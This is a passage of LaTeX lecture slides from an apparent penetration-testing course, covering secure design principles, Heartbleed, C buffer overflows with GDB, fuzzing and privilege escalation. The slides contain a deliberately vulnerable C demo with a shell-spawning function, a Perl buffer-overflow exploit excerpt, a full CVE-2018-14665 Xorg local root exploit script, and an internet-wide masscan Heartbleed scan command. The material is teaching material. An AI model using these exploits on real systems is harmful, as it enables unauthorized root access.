\documentclass[Screen16to9,17pt]{foils}
\usepackage{zencurity-slides}

\externaldocument{kea-pentest-exercises}
\selectlanguage{english}

%VF 3 Netværkspenetrationstest (5 ECTS)
% Indhold
%Den studerende lærer om hvordan en penetration test udføres, samt kan indhente oplysninger om de seneste sårbarheder, og kan benytte sig af de relevante værktøjer til dette formål.
%Viden
%Den studerende viden om og forståelse for:
%* Etiske samt kontraktuelle forhold omkring en penetrationstest.
%* Standardiseringorganisationers og myndigheders krav til og om penetrationstesting
%Færdigheder
%Den studerende kan:
%Tage højde for sikkerhedsaspekter ved at:
%* Anvende relevante metoder ved udførsel af en penetrationstest
%* Udarbejde en angrebsplan ud fra indsamlede oplysninger om et mål
%* Finde sårbarheder i et givet system
% * Dokumentere og rapportere fundne sårbarheder
% Kompetencer
%Den studerende kan:
% * Planlægge en penetration test, samt eksekvere den både ved brug af værktøjer og manuelt.


\begin{document}

\mytitlepage
{2. Programming and basic buffer overflows}
{KEA Kompetence Penetration Testing}




\slide{Plan for today}

\begin{list1}
\item Subjects
\begin{list2}
\item Programming and basic buffer overflows
\item C programming problems
\item Disassembly -- No real reverse engineering today! Sorry, later
\end{list2}
\item Exercises
\begin{list2}
\item C data types example
\item Buffer Overflow 101
\end{list2}
\item  Reading Curriculum:
\begin{list2}
\item Grayhat chapters 2-3,11
\end{list2}
\item  Reading Related resources:
\begin{list2}
\item \emph{Smashing The Stack For Fun And Profit} by Aleph One, \emph{Bypassing non-executable-stack during exploitation using return-to-libc} by c0ntex and \emph{Basic Integer Overflows} by blexim
\end{list2}
\end{list1}



\slide{Goals for today}


%{\hlkbig En 3 dages workshop, hvor du lærer at angribe dit netværk!}
\hlkimage{12cm}{software.pdf}


\begin{list1}
\item Programming errors and exploiting basic buffer overflows
\end{list1}



\slide{Design vs Implementation}

Software vulnerabilities can be divided into two major categories:
\begin{list2}
\item Design vulnerabilities
\item Implementation vulnerabilities
\end{list2}

Even with a well-thought-out security design a program can contain implementation flaws.

\slide{Common Secure Design Issues}

\begin{list2}
\item Design must specify the security model's structure\\
Not having this written down is a common problem
\item Common problem AAA Authentication, Authorization, Accounting (book uses audited)
\item Weak or Missing Session Management
\item Weak or Missing Authentication
\item Weak or Missing Authorization
\end{list2}


\slide{Input Validation}

Missing or flawed input validation is the number one cause of many of the most severe vulnerabilities:
\begin{list2}
\item Buffer overflows - writing into control structures of programs, taking over instructions and program flow
\item SQL injection - executing commands and queries in database systems
\item Cross-site scripting - web based attack type
\item Recommend centralizing validation routines
\item Perform validation in secure context, controller on server
\item Secure component boundaries
\end{list2}

\slide{Weak Structural Security}

Our book describes more design flaws:
\begin{list2}
\item Large Attack surface
\item Running a Process at Too High a Privilege Level, dont run everything as root or administrator
\item No Defense in Depth, use more controls, make a strong chain
\item Not Failing Securely
\item Mixing Code and Data
\item Misplaced trust in External Systems
\item Insecure Defaults
\item Missing Audit Logs
\end{list2}

\slide{Secure Programming for Linux and Unix Howto}

\begin{list1}
\item More information about systems design and implementation can be found in the free resource:
\item Secure Programming for Linux and Unix HOWTO, David Wheeler
\item \link{https://dwheeler.com/secure-programs/Secure-Programs-HOWTO.pdf}
\item Chapter 5. Validate All Input details input validation in the context of Unix programs
\item Chapter 6. Restrict Operations to Buffer Bounds (Avoid Buffer Overflow)
\item Chapter 7. Design Your Program for Security
\end{list1}


\slide{Principle of Least Privilege}

\begin{list1}
\item {\bf Definition 14-1} The \emph{principle of least privilege} states that a subject should be given only those privileges that it needs in order to complete the task.
\item Also drop privileges when not needed anymore, relinquish rights immediately
\item Example, need to read a document - but not write.
\item Database systems can often provide very fine grained access to data
\end{list1}


\slide{Principle of Least Authority}

\begin{list1}
\item
\item {\bf Definition 14-2} The \emph{principle of least authority} states that a subject should be given only the authority that it needs in order to complete its task.
\item Closely related to principle of least privilege
\item Depend if there is distinction between \emph{permission} and \emph{authority}
\item Permission - what actions a process can take on objects directly
\item Authority - as determining what effects a process may have on an object, either directly or indirectly through its interactions with other processes or subsystems
\item Book uses the example of information flow, passing information to second subject that can write
\end{list1}


\slide{Principle of Fail-Safe defaults}

\begin{list1}
\item {\bf Definition 14-3} The \emph{principle of fail-safe defaults} states that, unless a subject is given explicit access to an object, it should be denied access to that object.
\item Default access \emph{none}
\item In firewalls default-deny - that which is not allowed is prohibited
\item Newer devices today can come with no administrative users, while older devices often came with default admin/admin users
\item Real world example, OpenSSH config files that come with \verb+PermitRootLogin no+
\end{list1}


\slide{Principle of Economy of Mechanism}

\begin{list1}
\item {\bf Definition 14-4} The \emph{principle of economy of mechanism} states that security mechanisms should be as simple as possible.
\item Simple $->$ fewer complications $->$ fewer security errors
\item Use WPA passphrase instead of MAC address based authentication
\item
\end{list1}



\slide{Principle of Open Design}

\hlkimage{8cm}{debath-stego.png}

Source: picture from \link{https://www.cs.cmu.edu/~dst/DeCSS/Gallery/Stego/index.html}
\begin{list1}
\item {\bf Definition 14-6} The \emph{principle of open design} states that the security of a mechanism should not depend on the secrecy of its design or implementation.
\item Content Scrambling System (CSS) used on DVD movies
\item Mobile data encryption  A5/1 key - see next page
\end{list1}

\slide{Mobile data encryption  A5/1 key}

\begin{quote}
  Real Time Cryptanalysis of A5/1 on a PC
Alex Biryukov * Adi Shamir ** David Wagner ***

  Abstract. A5/1 is the strong version of the encryption algorithm used by about 130 million GSM customers in Europe to protect the over-the-air privacy of their cellular voice and data communication. The best published attacks against it require between 240 and 245 steps. ...
  In this paper we describe new attacks on A5/1, which are based on subtle flaws in the tap structure of the registers, their noninvertible clocking mechanism, and their frequent resets. After a 248 parallelizable data preparation stage (which has to be carried out only once), the actual attacks can be {\bf carried out in real time on a single PC.}

  The first attack requires the output of the A5/1 algorithm during the first two minutes of the conversation, and computes the key in about one second. The second attack requires the output of the A5/1 algorithm during about two seconds of the conversation, and computes the key in several minutes.
  ...
  The approximate design of A5/1 was leaked in 1994, and the exact design of both A5/1 and A5/2 was reverse engineered by Briceno from an actual GSM telephone in 1999 (see [3]).
\end{quote}
Source: \link{http://cryptome.org/a51-bsw.htm}


\slide{Principle of Separation of Privilege}

\hlkimage{4cm}{security-layers-1-uk.pdf}
\begin{list1}
\item {\bf Definition 14-7} The \emph{principle of separation of privilege} states that a system should not grant permission based on a single condition.
\item Company checks, CEO fraud
\item Programs like \emph{su} and \emph{sudo} often requires specific group membership and password
\end{list1}


\slide{Principle of Least Common Mechanism}

\begin{list1}
\item {\bf Definition 14-8} The \emph{principle of least common mechanism} states that mechanisms used to access resources should not be shared.
\item Minimize number of shared mechanisms and resources
\item Also mentions stack protection, randomization
\end{list1}



\slide{Principle of Least Astonishment}

\begin{list1}
\item {\bf Definition 14-9} The \emph{principle of least astonishment} states that security mechanisms should be designed so that users understand the reason that the mechanism works they way it does and that using the mechanism is simple.
\item Security model must be easy to understand and targetted towards users and system administrators
\item Confusion may undermine the security mechanisms
\item Make it easy and as intuitive as possible to use
\item Make output clear, direct and useful\\
Exception user supplies wrong password, tell login failed but not if user or password was wrong
\item Make documentation correct, but the program best
\item Psychological acceptability - should not make resource more difficult to access
\end{list1}



\slide{Zero day 0-day vulnerabilities}

\begin{quote}

  Project Zero's team mission is to "make zero-day hard", i.e. to make it more costly to discover and exploit security vulnerabilities. We primarily achieve this by performing our own security research, but at times we also study external instances of zero-day exploits that were discovered "in the wild". These cases provide an interesting glimpse into real-world attacker behavior and capabilities, in a way that nicely augments the insights we gain from our own research.

  Today, we're sharing our tracking spreadsheet for publicly known cases of detected zero-day exploits, in the hope that this can be a useful community resource:

  Spreadsheet link: 0day "In the Wild"\\
  \link{https://googleprojectzero.blogspot.com/p/0day.html}
\end{quote}

\begin{list2}
\item Not all vulnerabilities are found and reported to the vendors
\item Some vulnerabilities are exploited \emph{in the wild}
\end{list2}




\slide{Heartbleed CVE-2014-0160}

\hlkimage{19cm}{heartbleed-com.png}

Source: \link{http://heartbleed.com/}

\slide{Heartbleed is yet another bug in SSL products}

\begin{alltt}
What versions of the OpenSSL are affected?
Status of different versions:

* OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
* OpenSSL 1.0.1g is NOT vulnerable
* OpenSSL 1.0.0 branch is NOT vulnerable
* OpenSSL 0.9.8 branch is NOT vulnerable

Bug was introduced to OpenSSL in December 2011 and has been out
in the wild since OpenSSL release 1.0.1 on 14th of March
2012. OpenSSL 1.0.1g released on 7th of April 2014 fixes the bug.
\end{alltt}

\vskip 1cm
\centerline{It's just a bug - but a serious one}

\slide{Heartbleed hacking}

\begin{alltt}\footnotesize
  06b0: 2D 63 61 63 68 65 0D 0A 43 61 63 68 65 2D 43 6F  -cache..Cache-Co
  06c0: 6E 74 72 6F 6C 3A 20 6E 6F 2D 63 61 63 68 65 0D  ntrol: no-cache.
  06d0: 0A 0D 0A 61 63 74 69 6F 6E 3D 67 63 5F 69 6E 73  ...action=gc_ins
  06e0: 65 72 74 5F 6F 72 64 65 72 26 62 69 6C 6C 6E 6F  ert_order&billno
  06f0: 3D 50 5A 4B 31 31 30 31 26 70 61 79 6D 65 6E 74  =PZK1101&payment
  0700: 5F 69 64 3D 31 26 63 61 72 64 5F 6E 75 6D 62 65  _id=1&{\bf card_numbe}
  0710: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX  {\bf r=4060xxxx413xxx}
  0720: 39 36 26 63 61 72 64 5F 65 78 70 5F 6D 6F 6E 74  {\bf 96&card_exp_mont}
  0730: 68 3D 30 32 26 63 61 72 64 5F 65 78 70 5F 79 65  {\bf h=02&card_exp_ye}
  0740: 61 72 3D 31 37 26 63 61 72 64 5F 63 76 6E 3D 31  {\bf ar=17&card_cvn=1}
  0750: 30 39 F8 6C 1B E5 72 CA 61 4D 06 4E B3 54 BC DA  {\bf 09}.l..r.aM.N.T..
\end{alltt}

\begin{list2}
\item Obtained using Heartbleed proof of concepts -- Gave full credit card details
\item "Can XXX be exploited" -- yes, clearly! PoCs ARE needed\\
Without PoCs even Akamai wouldn't have repaired completely!
\item The internet was ALMOST fooled into thinking getting private keys\\
 from Heartbleed was not possible -- scary indeed.
\end{list2}

\slide{Proof of concept programs exist - god or bad?}

\centerline{Some of the tools released shortly after Heartbleed announcement}
\begin{list2}
\item \link{https://github.com/FiloSottile/Heartbleed} tool i Go\\
site \link{http://filippo.io/Heartbleed/}
\item \link{https://github.com/titanous/heartbleeder} tool i Go
\item \link{https://gist.github.com/takeshixx/10107280} test tool med STARTTLS support
\item \link{http://possible.lv/tools/hb/} test site
\item \link{https://twitter.com/richinseattle/status/453717235379355649} Practical Heartbleed attack against session keys links til, \link{https://www.mattslifebytes.com/?p=533} og "Fully automated here "\\ \link{https://www.michael-p-davis.com/using-heartbleed-for-hijacking-user-sessions/}

\item Metasploit er også opdateret på master repo\\ \link{https://twitter.com/firefart/status/453758091658792960}\\
\link{https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb}
\end{list2}


\slide{Scan for Heartbleed and SSLv2/SSLv3}

\hlkimage{6cm}{nmap-sslv2.png}

\begin{list1}
\item \verb+nmap -p 443 --script ssl-heartbleed <target>+\\
\link{https://nmap.org/nsedoc/scripts/ssl-heartbleed.html}
\item \verb+masscan 0.0.0.0/0 -p0-65535  --heartbleed+\\
\link{https://github.com/robertdavidgraham/masscan}
\end{list1}

\centerline{Almost every new vulnerability will have Nmap recipe}

\slide{Compare SSL}

\begin{alltt}
  /* Read type and payload length first */
    if (1 + 2 + 16 > s->s3->rrec.length)
        return 0; /* silently discard */
    hbtype = *p++;
    n2s(p, payload);
    if (1 + 2 + payload + 16 > s->s3->rrec.length)
        return 0; /* silently discard per RFC 6520 sec. 4 */
    pl = p;
\end{alltt}

\begin{list1}
\item Ditch OpenSSL - write our own?
\item SSL implementations compared - above code from OpenSSL copied from this:\\
\link{http://tstarling.com/blog/2014/04/ssl-implementations-compared/}
\item LibreSSL announced, OpenBSD people\\
 \link{http://www.libressl.org/} and \link{http://opensslrampage.org/}
\end{list1}

\slide{Key points after heartbleed}

\hlkimage{14cm}{ssl-tls-breaks-timeline.png}
Source: picture source\\ {\footnotesize\link{https://www.duosecurity.com/blog/heartbleed-defense-in-depth-part-2}}
\begin{list2}
\item Writing SSL software and other secure crypto software is hard
\item Configuring SSL is hard\\
check you own site \link{https://www.ssllabs.com/ssltest/}
\item SSL is hard, finding bugs "all the time"\\
\link{http://armoredbarista.blogspot.dk/2013/01/a-brief-chronology-of-ssltls-attacks.html}
\end{list2}

\slide{September 2015: Heartbleed vulnerable servers}

\hlkimage{10cm}{heartbleed-vulnerab-2015-sept.png}

Source: Data from Shodan and Shodan Founder John Matherly


\slide{2016: Heartbleed vulnerable servers}

\hlkimage{17cm}{heartbleed-vulnerab-2016.png}

Source: Data from Shodan and Shodan Founder John Matherly
\link{https://www.shodan.io/report/89bnfUyJ}


\exercise{ex:c-types}



\slide{Buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen.
\item {\bfseries Stack protection}
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}



\slide{Demo: Insecure programming buffer overflows 101}


\begin{list2}
\item Small demo program \verb+demo.c+ with built-in shell code, function \verb+the_shell+
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{minted}[fontsize=\footnotesize]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
int the_shell()
{  system("/bin/dash");  }
\end{minted}

NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.


\slide{Buffers and stacks, simplified}

\hlkimage{18cm}{buffer-overflow-1.pdf}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}

\slide{Overflow -- segmentation fault}

\hlkimage{18cm}{buffer-overflow-2.pdf}


\begin{list2}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list2}



\slide{GDB GNU Debugger}

\begin{list1}
\item GNU compileren og debuggeren fungerer ok, men check andre!
\item Prøv \verb+gdb ./demo+ og kør derefter programmet fra \emph{gdb prompten}
med  \verb+run 1234+
\item Når I således ved hvor lang strengen skal være kan I fortsætte
  med \verb+nm+ kommandoen -- til at finde adressen på
  \verb+the_shell+\\
Skriv \verb+nm demo | grep shell+

\item Kunsten er således at generere en streng der er præcist så lang
  at man får lagt denne adresse ind på det \emph{rigtige sted}.
\item Perl kan erstatte AAAAA således \verb+`perl -e "print 'A'x10"`+
\end{list1}


\slide{Debugging af C med GDB}

\begin{list1}
\item Vi laver sammen en session med GDB
\item Afprøvning med diverse input
\begin{list2}
\item \verb+./demo langstrengsomgiverproblemerforprogrammethvorformon+
\item \verb+gdb demo+ efterfulgt af run med parametre\\
\verb+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+
\end{list2}
\end{list1}

{\bfseries Hjælp:}\\
Kompiler programmet og kald det fra kommandolinien med
\verb+./demo 123456...7689+ indtil det dør ... derefter prøver I det
samme i GDB

Hvad sker der? Avancerede brugere kan ændre
\verb+strcpy+ til \verb+strncpy+


\slide{GDB output}

\begin{alltt}\footnotesize
hlk@bigfoot:demo$ gdb demo
GNU gdb 5.3-20030128 (Apple version gdb-330.1) (Fri Jul 16 21:42:28 GMT 2004)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "powerpc-apple-darwin".
Reading symbols for shared libraries .. done
(gdb) {\bf run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
Starting program: /Volumes/userdata/projects/security/exploit/demo/demo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols for shared libraries . done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal EXC_BAD_ACCESS, Could not access memory.
{\bf 0x41414140} in ?? ()
(gdb)
\end{alltt}

\slide{GDB output Debian 9 stretch}

\begin{alltt}\footnotesize
hlk@debian:~/demo$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
...
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) run `perl -e "print 'A'x24"`
Starting program: /home/hlk/demo/demo `perl -e "print 'A'x24"`
AAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
(gdb)
\end{alltt}






\slide{Exploits -- udnyttelse af sårbarheder}

\begin{list2}
\item Exploit/exploitprogram er udnytter en sårbarhed rettet mod et specifikt system.
\item Kan være 5 linier eller flere sider ofte Perl, Python eller et C program
\end{list2}

Eksempel demo i Perl, uddrag:
\begin{alltt}\footnotesize
$buffer = "";
$null = "\textbackslash{}x00";
$nop = "\textbackslash{}x90";

$nopsize = 1;
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0x01101d48; // address where shellcode is
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}
$address = pack('l', $the_shell_pointer);
$buffer .= $address;
exec "$program", "$buffer";
\end{alltt}


\exercise{ex:bufferoverflow}



\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries Privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på Unix afvikles som
nobody -- ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt -- få rettigheder = lille skade
\end{list1}

Eksempel: man finder exploit som giver kommandolinieadgang til et system
som almindelig bruger

Ved at bruge en local exploit, Linuxkernen kan man måske forårsage fejl
og opnå root, GNU Screen med SUID bit eksempelvis


\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries Remote root exploit}
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på Unix, over netværket.
\item {\bfseries Zero-day exploits} dem som ikke offentliggøres -- dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}


\slide{The Exploit Database -- dagens buffer overflow}

\hlkimage{12cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}

\slide{Metasploit and Armitage Still rocking the internet}


\hlkimage{14cm}{metasploit-about.png}

\begin{list1}

\item \link{http://www.metasploit.com/}
\item Armitage GUI fast and easy hacking for Metasploit\\
\link{http://www.fastandeasyhacking.com/}\\
\link{http://www.offensive-security.com/metasploit-unleashed/Main_Page}
\item Bog: Metasploit: The Penetration Tester's Guide, No Starch Press\\
ISBN-10: 159327288X - ældre bog, kan undværes
\end{list1}

\slide{Demo: Metasploit Armitage }

\hlkimage{10cm}{armitage-overview.png}




\slide{Forudsætninger}

\begin{list1}
\item Bemærk: alle angreb har forudsætninger for at virke
\item Et angreb mod Telnet virker kun hvis du bruger Telnet
\item Et angreb mod Apache HTTPD virker ikke mod Microsoft IIS
\item Som forsvarer: Kan du bryde kæden af forudsætninger har du vundet!
\item Eksempler på forudsætninger:
\item Computeren skal være tændt, Funktionen der misbruges skal være slået til, Executable stack, Executable heap, Fejl i programmet
\end{list1}

\vskip 2cm

\centerline{\color{titlecolor}\LARGE \bf alle programmer har fejl}


\slide{Hvordan finder man buffer overflow, og andre fejl}

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source betyder man kan læse og analysere koden
\item Source code review -- automatisk eller manuelt
\item Fejl kan findes ved at prøve sig frem -- fuzzing
\item Exploits virker typisk mod specifikke versioner af software
\end{list1}



\slide{Gode operativsystemer}

\begin{list1}
\item Nyere versioner af Microsoft Windows, Mac OS X og Linux distributionerne inkluderer:
\begin{list2}
\item Buffer overflow protection
\item Stack protection, non-executable stack
\item Heap protection, non-executable heap
\item \emph{Randomization of parameters} stack gap m.v.
\item ... en masse mere
\end{list2}
\item Vælg derfor hellere:
\begin{list2}
\item Windows 7/8/10, fremfor Windows XP
\item Mac OS X 10.11 fremfor 10.8
\item Linux sikkerhedsopdateringer, sig ja når de kommer
\end{list2}
\item Det samme gælder for serveroperativsystemer
\item NB: Meget få indlejrede systemer har beskyttelse! Internet of Thrash
\end{list1}

\slide{Defense in depth - multiple layers of security}

\hlkimage{5cm}{security-layers-1.pdf}

\centerline{Forsvar dig selv med flere lag af sikkerhed! }


\slide{Undgå standard indstillinger}

\begin{list1}
\item Når vi scanner efter services går det nemt med at finde dem
\item Giv jer selv mere tid til at omkonfigurere og opdatere ved at undgå standardindstillinger
\item Tiden der går fra en sårbarhed annonceres på internet til den
  bliver udnyttet er meget kort i dag! Timer!
\item Ved at undgå standard indstillinger kan der
  måske opnås en lidt længere frist -- inden ormene kommer
\item NB: Ingen garanti -- og det hjælper sjældent mod en dedikeret angriber
\item Dårlige passwords og konfigurationsfejl -- ofte overset
\end{list1}


\slide{Client side hacking: Java, Flash, PDF}

\hlkimage{26cm}{drive-by-download-wikipedia.png}

\vskip 1cm
\centerline{Kan vi undvære Java, Flash og PDF?}

Kilde: \link{https://en.wikipedia.org/wiki/Drive-by_download}



\slide{Flash blockers}

\hlkimage{13cm}{clicktoflash.png}

\begin{list1}
\item Slå Flash fra -- Afinstaller Flash
\item Brug kun indbyggede i eksempelvis Chrome - som opdateres løbende med browser
\end{list1}



\slide{Goals: Fuzzing}

\hlkimage{18cm}{fuzzer.pdf}

\begin{list1}
\item /dev/random is a file on Unix that gives random data
\item Sending random data to programs is called fuzzing and can reveal security problems
\item Lots of crashes is often the result, and when investigated may be exploitable
\item Recommended to use fuzzers that can use some structure and knowledge and then randomize individual fields in protocols, file types etc.
\end{list1}

\slide{What is Fuzzing}

\begin{quote}
  Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a file format or protocol and distinguishes valid from invalid input. An effective fuzzer generates semi-valid inputs that are "valid enough" in that they are not directly rejected by the parser, but do create unexpected behaviors deeper in the program and are "invalid enough" to expose corner cases that have not been properly dealt with.
\end{quote}
Source: \url{https://en.wikipedia.org/wiki/Fuzzing}

See also the original Fuzz report: \emph{An Empirical Study of the Reliability
of UNIX Utilities}, Barton P. Miller 1990\\
and updates \emph{Fuzz Revisited: A Re-examination of the Reliability
of UNIX Utilities and Services}\\
\url{http://pages.cs.wisc.edu/~bart/fuzz/}

\slide{Fuzz Revisited}

Fuzz Revisited: A Re-examination of the Reliability
of
UNIX Utilities and Services

\begin{quote}
We have tested the reliability of a large collection of basic UNIX utility programs, X-Window
applications and servers, and networkservices. We used a simple testing method of subjecting these
programs to a random inputstream.\\
...\\
The result of our testing is that we can crash (with coredump) or hang (infiniteloop) over 40\% (in the
worst case) of the basic programs and over 25\% of the X-Window applications.\\
...\\
We also tested how utility programs checked their return codes from the memory allocation library
routines by simulating the unavailability of virtual memory. We could crash almost half of the programs
that we tested in this way.
\end{quote}

\centerline{october 1995}



\slide{Example fuzzers}

Types of fuzzers
A fuzzer can be categorized as follows:[9][1]
\begin{list2}
\item A fuzzer can be generation-based or mutation-based depending on whether inputs are generated from scratch or by modifying existing inputs,
\item A fuzzer can be dumb or smart depending on whether it is aware of input structure, and
\item A fuzzer can be white-, grey-, or black-box, depending on whether it is aware of program structure.
\end{list2}


\slide{Simple fuzzer}

\begin{alltt}
$ for i in 10 20 30 40 50
>> do
>> ./demo `perl -e "print 'A'x$i"`
>> done
AAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Memory fault
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Memory fault
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Memory fault
\end{alltt}

\centerline{Memory fault/segmentation fault - juicy!}



\slide{Custom Fuzzers}

\hlkimage{4cm}{anp_cover-front-final.png}
The book we use in software security couse describes in AoST chapter 10: Implementing a custom Fuzz Utility

A very similar method can be found with more detail in the book,\\
\emph{Attacking Network Protocols A Hacker's Guide to Capture, Analysis, and Exploitation}\\
by James Forshaw December 2017, 336 pp. ISBN-13: 9781593277505

\url{https://nostarch.com/networkprotocols}

\slide{Use Developer Libraries}

Note how the custom fuzzer described in the book used the SOAPpy library and thus created a fuzzer in very few lines of code.

Especially for common and binary protocols re-using existing code helps.

This goes for:
\begin{list2}
\item DNS - Domain Name System, a binary protocol
\item HTTP with encryption, compression, WSDL, REST, XML-RPC etc.
\item Open source libraries with different file types
\end{list2}


\slide{Fuzzing local processes}

The book describes in AoST chapter 11: Local Fault Injection, how to send data to local processes through:

\begin{list2}
\item command line, environment variables, interprocess communication, shared memory, config files, input files, registry keys and system settings
\item Also the book notes, the kernels running may be vulnerable
\item Both Windows and Unix have similar features, that can be abused
\item Goal is usually command execution, and privilege escalation
\item When you have a foothold and can execute commands, you can often find local exploits for kernel or drivers
\end{list2}

\slide{Attacking Local Applications}

\begin{list2}
\item Enumerate local resources used by the application
\item Determine access permissions of shared or persistent resources
\item Identify the exposed local attack surface area
\item Best case examine the application source code
\item Also monitor application behaviors during execution
\end{list2}


\slide{CVE-2018-14665 Multiple Local Privilege Escalation}

\begin{alltt}\footnotesize
#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root.
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
 -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back
echo [+] type 'Password1' and hit enter for root
su -
\end{alltt}
Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}

\begin{list2}
\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}

%\item Example exploit method, write cron job - wait for shell:\\
%\url{https://www.exploit-db.com/exploits/45742}
\end{list2}



\slide{Fuzzing File Formats}



\begin{list2}
\item Lots of applications open files, and some are not designed for safety and security
\item File formats are also complex and difficult to parse
\item Files served over HTTP is no exception
\item Browsers have been susceptible to various attacks from the start
\item We have seen problems with ActiveX components, as described in book
\item Also Java has had a lot of problems over the years - JRE 617 vulnerabilities 2010 - 2019\\
\url{https://www.cvedetails.com/product/19117/Oracle-JRE.html?vendor_id=93}
\item Adobe Flash player - 1075 vulnerabilities 2005 - 2019\\
\url{https://www.cvedetails.com/product/6761/Adobe-Flash-Player.html?vendor_id=53}
\item Adobe Acrobat Reader PDF - 681 vulnerabilities from 1999 to 2018!\\ \url{https://www.cvedetails.com/product/497/Adobe-Acrobat-Reader.html?vendor_id=53}
\end{list2}

\slide{Pwn2Own - attacking browsers}

\begin{quote}
Contest 2015–2018
In 2015,[61] every single prize available was claimed.

In 2016, Chrome, Microsoft Edge and Safari were all hacked.[62] According to Brian Gorenc, manager of Vulnerability Research at HPE, they had chosen not to include Firefox that year as they had "wanted to focus on the browsers that [had] made serious security improvements in the last year".[63]

In 2017, Chrome did not have any successful hacks (although only one team attempted to target Chrome), the subsequent browsers that best fared were, in order, Firefox, Safari and Edge.[64]

In 2018, the conference was much smaller and sponsored primarily by Microsoft. Shortly before the conference, Microsoft had patched several vulnerabilities in Edge, causing many teams to withdraw. Nevertheless, certain openings were found in Edge, Safari, Firefox and more.[65] No hack attempts were made against Chrome,[66][67] although the reward offered was the same as for Edge.[68] While many Microsoft products had large rewards available to anyone who was able to gain access through them, only Edge was successfully exploited.
\end{quote}

Pwn2Own
\url{https://en.wikipedia.org/wiki/Pwn2Own}


\slide{Example Linux Kernel Vulnerabilities}

The Linux kernel has had some vulnerabilities over the years:\\
This link is for: Linux » Linux Kernel : Security Vulnerabilities (CVSS score >= 9)\\

{\footnotesize\url{https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-9/cvssscoremax-/Linux-Linux-Kernel.html}}

Linux Kernel 2308 vulnerabilities from 1999 to 2019\\
\url{https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33}

\slide{Linux Kernel Fuzzing}

\begin{list2}
\item CVE-2016-0758 Integer overflow in lib/asn1\_decoder.c in the Linux kernel before 4.6 allows local users to gain privileges via crafted ASN.1 data.\\
